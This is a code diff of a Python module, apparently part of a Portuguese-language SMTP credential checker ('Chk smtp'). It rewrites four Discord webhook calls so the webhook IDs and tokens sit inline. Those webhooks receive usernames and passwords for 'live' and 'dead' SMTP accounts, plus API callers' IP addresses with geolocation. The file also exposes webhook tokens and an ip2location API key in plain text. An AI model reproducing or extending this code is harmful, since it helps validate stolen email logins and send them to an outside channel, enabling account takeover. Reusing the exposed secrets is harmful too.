@@ -6,7 +6,6 @@ WEBHOOK_LOGGLOBAL = "https://discord.com/api/webhooks/1214666816899645440/2w6_PH
 WEBHOOK_LOGSMTPLIVE = "https://discord.com/api/webhooks/1214719832855941190/MPT9JKHYpEbjsgoCndOgzwZ--QKI8WA8zoMhhEcUSVZlb0Vvs_EGgKqBevqIZJglfR41"
 WEBHOOK_LOGSMTPDIE = "https://discord.com/api/webhooks/1214720028436602900/95fGGoL8ondJhlvkYviLWcfpcjmct8XV0XsKRGwNcMzldf_pTjJ3El4BEgCaGTgVmKUl"
 WEBHOOK_LOGSMTPINICIOU = "https://discord.com/api/webhooks/1214719588512702554/2hPLuTyfeN2GMQ-s2zFgcSJf4a0tJXX8xZ5VU5Jjt34ybzEfiQVFPhODAuybr7i7Rhmq"
-
 APIKEY_IP = "14BA97C3E17085BC09E136C65320E9EE"
 def obter_geoip(api_key,ip_address):
     url = f"https://api.ip2location.io/?key={api_key}&ip={ip_address}&format=json"
@@ -29,7 +28,7 @@ def obter_geoip(api_key,ip_address):
     else:
         return None, None, None, None, None, None, None, None, None, None, None, None
 def enviarlogAPIglobal(funcao,ip,usuario):
-    webhook = Webhook.from_url(WEBHOOK_LOGGLOBAL, adapter=RequestsWebhookAdapter())
+    webhook = Webhook.partial("1214666816899645440", "2w6_PHz_j982iKkCwaV1jIdFOKFUXkg78ksUQYIc9t-PGMNRrr_9HAW1Gz3bZt7D-XkO", adapter=RequestsWebhookAdapter())
     ip, country_code, country_name, region_name, city_name, latitude, longitude, zip_code, time_zone, asn, as_name, is_proxy = obter_geoip(APIKEY_IP,ip)
     embed = Embed(title="LOG API", description="novo comando efetuado na api")
     embed.add_field(name="Usuario", value=usuario, inline=True)
@@ -45,7 +44,7 @@ def enviarlogAPIglobal(funcao,ip,usuario):
     embed.timestamp = datetime.utcnow()
     webhook.send(embed=embed)
 def enviarlogSMTPlive(user,passwrd):
-    webhook = Webhook.from_url(WEBHOOK_LOGSMTPLIVE, adapter=RequestsWebhookAdapter())
+    webhook = Webhook.partial("1214719832855941190", "MPT9JKHYpEbjsgoCndOgzwZ--QKI8WA8zoMhhEcUSVZlb0Vvs_EGgKqBevqIZJglfR41", adapter=RequestsWebhookAdapter())
     embed = Embed(title="SMTP LIVE!", description="nova live encontrada")
     embed.add_field(name="Usuario", value=user, inline=True)
     embed.add_field(name="Senha", value=passwrd, inline=True)
@@ -58,7 +57,7 @@ def enviarlogSMTPlive(user,passwrd):
     embed.timestamp = datetime.utcnow()
     webhook.send(embed=embed)
 def enviarlogAPISMTPdie(user,passwrd):
-    webhook = Webhook.from_url(WEBHOOK_LOGSMTPDIE, adapter=RequestsWebhookAdapter())
+    webhook = Webhook.partial("1214720028436602900", "95fGGoL8ondJhlvkYviLWcfpcjmct8XV0XsKRGwNcMzldf_pTjJ3El4BEgCaGTgVmKUl", adapter=RequestsWebhookAdapter())
     embed = Embed(title="SMTP DIE!", description="")
     embed.add_field(name="Usuario", value=user, inline=True)
     embed.add_field(name="Senha", value=passwrd, inline=True)
@@ -71,7 +70,7 @@ def enviarlogAPISMTPdie(user,passwrd):
     embed.timestamp = datetime.utcnow()
     webhook.send(embed=embed)
 def enviarlogAPISMTPinicio(usuario,qntlista,):
-    webhook = Webhook.from_url(WEBHOOK_LOGSMTPINICIOU, adapter=RequestsWebhookAdapter())
+    webhook = Webhook.partial("1214719588512702554", "2hPLuTyfeN2GMQ-s2zFgcSJf4a0tJXX8xZ5VU5Jjt34ybzEfiQVFPhODAuybr7i7Rhmq", adapter=RequestsWebhookAdapter())
     embed = Embed(title="TESTE SMTP INICIADO", description="Chk smtp iniciado com sucesso")
     embed.add_field(name="Quantida de logs", value=qntlista, inline=True)
     embed.add_field(name="Usuario Solicitante", value=usuario, inline=True)
